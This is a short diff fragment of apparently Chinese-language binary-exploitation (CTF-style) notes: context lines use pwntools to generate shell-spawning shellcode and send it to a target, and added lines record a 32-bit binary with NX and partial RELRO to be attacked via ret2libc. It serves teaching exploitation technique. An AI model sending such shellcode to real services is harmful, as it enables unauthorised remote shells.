@@ -26,6 +26,8 @@ shellcode = asm(shellcraft.sh())
 io.sendline(shellcode)                 
 生成一个 Shellcode
 # 将生成的 Shellcode 发送到目标
+4、32位开启NX保护，部分开启RELRO保护
+具体攻击手法为：ret2libc
 
 
 
